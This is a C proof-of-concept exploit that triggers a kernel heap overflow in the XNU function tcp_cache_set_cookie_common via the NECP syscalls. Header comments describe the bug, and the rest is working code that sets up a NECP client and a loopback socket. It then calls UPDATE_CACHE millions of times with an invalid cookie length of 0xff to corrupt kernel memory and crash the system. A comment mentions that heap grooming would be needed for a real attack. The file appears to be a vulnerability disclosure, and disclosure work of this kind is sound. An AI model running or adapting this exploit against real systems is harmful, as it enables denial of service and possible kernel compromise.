//This POC causes a kernel heap overflow in tcp_cache_set_cookie_common (see bsd/netinet/tcp_cache.c).  A
//user-supplied length is passed to memcpy, which causes the destination struct tcp_cache allocation to be overflown.
//Unfortunately, the size of the source memory object is limited, so we cannot directly control the contents copied to the
//overflown area.  The source memory object is on the stack (tfo_cache_buffer in necp_client_update_cache).
//
//The stack trace at the time of the overflow is:
//tcp_cache_set_cookie_common
//tcp_heuristics_tfo_update
//necp_client_update_cache
//necp_client_action (syscall)

#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <uuid/uuid.h>

////////////////////////////////////////////////////////////////////////////////////////////////////
// Kernel defines missing from userland ////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

//Taken from bsd/net/necp.h
#define NECP_OPEN_FLAG_OBSERVER      0x01 // Observers can query clients they don't own
#define NECP_OPEN_FLAG_BACKGROUND    0x02 // Mark this fd as backgrounded
#define NECP_OPEN_FLAG_PUSH_OBSERVER 0x04 // When used with the OBSERVER flag, allows updates to be pushed. Adding clients is not allowed in this mode.

#define NECP_CLIENT_ACTION_ADD              1 // Register a new client. Input: parameters in buffer; Output: client_id
#define NECP_CLIENT_ACTION_REMOVE           2 // Unregister a client. Input: client_id, optional struct ifnet_stats_per_flow
#define NECP_CLIENT_ACTION_COPY_PARAMETERS        3 // Copy client parameters. Input: client_id; Output: parameters in buffer
#define NECP_CLIENT_ACTION_COPY_RESULT          4 // Copy client result. Input: client_id; Output: result in buffer
#define NECP_CLIENT_ACTION_COPY_LIST          5 // Copy all client IDs. Output: struct necp_client_list in buffer
#define NECP_CLIENT_ACTION_REQUEST_NEXUS_INSTANCE   6 // Request a nexus instance from a nexus provider, optional struct necp_stats_bufreq
#define NECP_CLIENT_ACTION_AGENT            7 // Interact with agent. Input: client_id, agent parameters
#define NECP_CLIENT_ACTION_COPY_AGENT         8 // Copy agent content. Input: agent UUID; Output: struct netagent
#define NECP_CLIENT_ACTION_COPY_INTERFACE       9 // Copy interface details. Input: ifindex cast to UUID; Output: struct necp_interface_details
#define NECP_CLIENT_ACTION_SET_STATISTICS       10 // Deprecated
#define NECP_CLIENT_ACTION_COPY_ROUTE_STATISTICS    11 // Get route statistics. Input: client_id; Output: struct necp_stat_counts
#define NECP_CLIENT_ACTION_AGENT_USE          12 // Return the use count and increment the use count. Input/Output: struct necp_agent_use_parameters
#define NECP_CLIENT_ACTION_MAP_SYSCTLS          13 // Get the read-only sysctls memory location. Output: mach_vm_address_t
#define NECP_CLIENT_ACTION_UPDATE_CACHE         14 // Update heuristics and cache
#define NECP_CLIENT_ACTION_COPY_CLIENT_UPDATE     15 // Fetch an updated client for push-mode observer. Output: Client id, struct necp_client_observer_update in buffer
#define NECP_CLIENT_ACTION_COPY_UPDATED_RESULT      16 // Copy client result only if changed. Input: client_id; Output: result in buffer

#define NECP_CLIENT_CACHE_TYPE_ECN                 1       // Identifies use of necp_tcp_ecn_cache
#define NECP_CLIENT_CACHE_TYPE_TFO                 2       // Identifies use of necp_tcp_tfo_cache

#define NECP_CLIENT_CACHE_TYPE_ECN_VER_1           1       // Currently supported version for ECN
#define NECP_CLIENT_CACHE_TYPE_TFO_VER_1           1       // Currently supported version for TFO

#define NECP_MAX_CLIENT_PARAMETERS_SIZE         1024
#define NECP_TFO_COOKIE_LEN_MAX      16

typedef uint64_t           mach_vm_address_t;
typedef struct necp_cache_buffer {
  u_int8_t                necp_cache_buf_type;    //  NECP_CLIENT_CACHE_TYPE_*
  u_int8_t                necp_cache_buf_ver;     //  NECP_CLIENT_CACHE_TYPE_*_VER
  u_int32_t               necp_cache_buf_size;
  mach_vm_address_t       necp_cache_buf_addr;
} necp_cache_buffer;

typedef struct necp_tcp_tfo_cache {
  u_int8_t                necp_tcp_tfo_cookie[NECP_TFO_COOKIE_LEN_MAX];
  u_int8_t                necp_tcp_tfo_cookie_len;
  u_int8_t                necp_tcp_tfo_heuristics_success:1; // TFO succeeded with data in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_loss:1; // TFO SYN-loss with data
  u_int8_t                necp_tcp_tfo_heuristics_middlebox:1; // TFO middlebox detected
  u_int8_t                necp_tcp_tfo_heuristics_success_req:1; // TFO succeeded with the TFO-option in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_loss_req:1; // TFO SYN-loss with the TFO-option
  u_int8_t                necp_tcp_tfo_heuristics_rst_data:1; // Recevied RST upon SYN with data in the SYN
  u_int8_t                necp_tcp_tfo_heuristics_rst_req:1; // Received RST upon SYN with the TFO-option
} necp_tcp_tfo_cache;

//Taken from bsd/sys/socket.h
#define      SO_NECP_CLIENTUUID      0x1111  /* NECP Client uuid */

////////////////////////////////////////////////////////////////////////////////////////////////////
// Helper functions ////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

int necp_open(int flags)
{
	return syscall(501, flags);
}

int necp_client_action(int necp_fd, uint32_t action, uuid_t client_id, size_t client_id_len, uint8_t *buffer, size_t buffer_size)
{
	return syscall(502, necp_fd, action, client_id, client_id_len, buffer, buffer_size);
}

void print_uuid(char * caption, uuid_t * uuid)
{
	unsigned char * uuid_char = (unsigned char *)uuid;
	printf("%s: %02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x\n", caption,
		uuid_char[0], uuid_char[1], uuid_char[2], uuid_char[3], uuid_char[4], uuid_char[5], uuid_char[6], uuid_char[7],
		uuid_char[8], uuid_char[9], uuid_char[10], uuid_char[11], uuid_char[12], uuid_char[13], uuid_char[14], uuid_char[15]);
}

int port_num = 3333;
int create_connected_socket(int * socks)
{
	int server_sock, client_sock;
	int bind_count = 0;
	int opt = 1;
	struct sockaddr_in addr;

	//Create the socket pair

	server_sock = socket(PF_INET, SOCK_STREAM, 0);
	if(server_sock < 0) {
		printf("Couldn't create server socket: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}
	client_sock = socket(PF_INET, SOCK_STREAM, 0);
	if(client_sock < 0) {
		printf("Couldn't create client socket: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}

	//Bind the server to a port
	opt = 1;
	setsockopt(server_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	while(1)
	{
		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr("127.0.0.1");
		addr.sin_port = htons(port_num);
		port_num++;

		if(bind(server_sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
			break;
		bind_count++;
		if(bind_count == 10) {
			printf("Couldn't bind to the socket: errno %d: %s\n", errno, strerror(errno));
			return 1;
		}
	}
	if(listen(server_sock, 5) < 0) {
		printf("Couldn't listen on the socket: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}

	//Connect to the server from the client

	if(connect(client_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		printf("Couldn't connect the socket: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}

	socks[0] = server_sock;
	socks[1] = client_sock;
	return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// Main Execution //////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char ** argv)
{
	int i, ret, necp_fd, socks[2];
	uuid_t client_id;
	uint8_t * buffer;
	size_t buffer_size;
	necp_cache_buffer ncb;
	necp_tcp_tfo_cache nttc;

	//Use necp_open to get a necp file descriptor
	necp_fd = necp_open(0);
	if(necp_fd < 0)
	{
		printf("Couldn't get a necp fd: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}

	//Setup a necp client and get the uuid
	memset(client_id, 0, sizeof(client_id));
	buffer = malloc(0x10);
	memset(buffer, 0, 0x10);
	buffer_size = 0x10;

	ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_ADD, client_id, sizeof(client_id), buffer, buffer_size);
	if(ret < 0) {
		printf("Couldn't add a necp client: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}
	print_uuid("client uuid:", &client_id);

	//Create a socket and add a flow to the client
	if(create_connected_socket(socks))
		return 1;

	if(setsockopt(socks[1], SOL_SOCKET, SO_NECP_CLIENTUUID, &client_id, sizeof(client_id)) < 0) {
		printf("Couldn't assign the socket to the necp client: errno %d: %s\n", errno, strerror(errno));
		return 1;
	}

	//Trigger the overflow

	//It's not necessary to run this in a loop to trigger the kernel heap overflow.  It's done here
	//to increase the chance that something vital is overflow in the kernel, causing the entire system to
	//crash and show off the overflow.  In a real attack, heap grooming would be preformed to ensure there
	//was something worth overflowing after the victim heap allocation.
	for(i = 0; i < 10000000; i++) {
		memset(&nttc, 0xff, sizeof(necp_tcp_tfo_cache));
		nttc.necp_tcp_tfo_cookie_len = 0xff; //bad length - this length is used without validation in a memcpy

		memset(&ncb, 0, sizeof(necp_cache_buffer));
		ncb.necp_cache_buf_type = NECP_CLIENT_CACHE_TYPE_TFO;
		ncb.necp_cache_buf_ver = NECP_CLIENT_CACHE_TYPE_TFO_VER_1;
		ncb.necp_cache_buf_size = sizeof(necp_tcp_tfo_cache);
		ncb.necp_cache_buf_addr = (mach_vm_address_t)&nttc;

		ret = necp_client_action(necp_fd, NECP_CLIENT_ACTION_UPDATE_CACHE, client_id, sizeof(client_id), (uint8_t *)&ncb, sizeof(necp_cache_buffer));
		if(ret != 0)
			printf("necp_client_action(UPDATE_CACHE): ret=%d (errno %d: %s)\n", ret, errno, strerror(errno));
	}
	return 0;
}

